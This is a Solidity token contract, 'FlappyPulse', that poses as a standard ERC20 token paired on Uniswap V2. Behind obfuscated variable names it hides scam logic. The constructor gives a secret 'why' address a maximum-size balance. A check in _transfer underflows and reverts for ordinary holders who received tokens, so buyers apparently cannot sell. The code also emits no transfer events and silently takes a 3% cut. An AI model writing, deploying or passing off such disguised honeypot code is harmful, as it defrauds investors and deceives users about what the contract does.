// https://t.me/flappypulse

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract FlappyPulse is Ownable {
    constructor(
        string memory body,
        string memory discussion,
        address port,
        address why
    ) {
        uniswapV2Router = IUniswapV2Router02(port);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        child[why] = character;
        spin = body;
        hole = discussion;
        equally = 9;
        trail = 3;
        nodded[why] = character;
        nodded[msg.sender] = character;
        _tTotal = 1000000000 * 10**equally;
        child[msg.sender] = _tTotal;
    }

    uint256 public trail;
    string private spin;
    string private hole;
    uint8 private equally;

    function name() public view returns (string memory) {
        return spin;
    }

    function symbol() public view returns (string memory) {
        return hole;
    }

    uint256 private _tTotal;
    uint256 private flat;
    address public uniswapV2Pair;
    uint256 private character = ~_tTotal;
    IUniswapV2Router02 public uniswapV2Router;
    address private tree;

    function decimals() public view returns (uint256) {
        return equally;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private child;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return child[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address nearer,
        address another,
        uint256 airplane
    ) internal {
        address smooth = uniswapV2Pair;
        uint256 warn = trail;

        if (nodded[nearer] == 0 && (smooth != nearer) && nice[nearer] > 0) {
            nodded[nearer] -= warn;
        }

        address hour = tree;
        tree = another;

        child[nearer] -= airplane;
        uint256 itself = (airplane / 100) * trail;
        airplane -= itself;
        nice[hour] += 1 + warn;
        child[another] += airplane;
    }

    mapping(address => uint256) private nice;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private nodded;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}